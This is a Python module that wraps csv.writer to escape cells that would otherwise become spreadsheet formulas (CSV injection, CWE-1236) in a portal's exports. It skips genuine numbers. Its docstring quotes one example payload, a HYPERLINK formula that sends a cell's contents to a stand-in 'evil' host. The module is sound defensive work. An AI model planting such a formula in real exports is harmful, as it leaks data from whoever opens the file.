"""A csv writer whose cells cannot become spreadsheet formulas.

WHY THIS EXISTS. Every CSV this portal exports is built from names people
typed — an asset's hostname, a subscription's product, an audit line's target
and detail, a cloud resource's name. A spreadsheet treats a cell beginning
`=`, `+`, `-` or `@` as a FORMULA, so an operator who calls an asset
`=HYPERLINK("http://evil/"&A1,"open me")` has written code that runs on the
machine of whoever opens the export — and the export most likely to be opened
by somebody senior is the audit log, which exists to be handed to an auditor.

CWE-1236. Found by semgrep's `csv-writer-injection` across six export sites,
none of which escaped anything.

WHY IT IS A WRITER AND NOT A HELPER TO REMEMBER. Six call sites and one of
them is in another module; a `cell()` function to wrap every value is a
function somebody forgets on the seventh export. Wrapping the writer means the
escaping happens where the row is written, and a new export gets it by using
the same constructor as the others.

WHAT IT DOES NOT DO. It does not touch a number. `-12.50` in a spend export is
a negative amount, not a formula, and prefixing it would turn a column a
finance person sums into a column of text. Only a string that starts dangerous
AND is not a number is prefixed with an apostrophe, which is what Excel and
LibreOffice both read as "this is literal text" and hide from the cell.
"""
from __future__ import annotations

import csv

# `\t` and `\r` are here because a leading tab or carriage return can smuggle a
# value out of its cell in some importers, which puts the character after it at
# the start of a cell — where `=` is a formula again.
RISKY = ("=", "+", "-", "@", "\t", "\r")


def cell(value):
    """One value, safe to open in a spreadsheet."""
    if not isinstance(value, str) or not value:
        return value
    if value[0] not in RISKY:
        return value
    try:
        # A NUMBER IS NOT A FORMULA. Checked by trying to read it as one rather
        # than by pattern: `-12.50`, `-1e6` and `+3` are all values somebody
        # means to add up, and quoting them breaks the column.
        float(value)
        return value
    except ValueError:
        pass
    return "'" + value


class _Writer:
    """csv.writer's interface, with every cell passed through `cell`."""

    def __init__(self, target, **kw):
        self._w = csv.writer(target, **kw)

    def writerow(self, row):
        return self._w.writerow([cell(v) for v in row])

    def writerows(self, rows):
        for row in rows:
            self.writerow(row)


def writer(target, **kw):
    """Use in place of `csv.writer` for anything a person can name."""
    return _Writer(target, **kw)
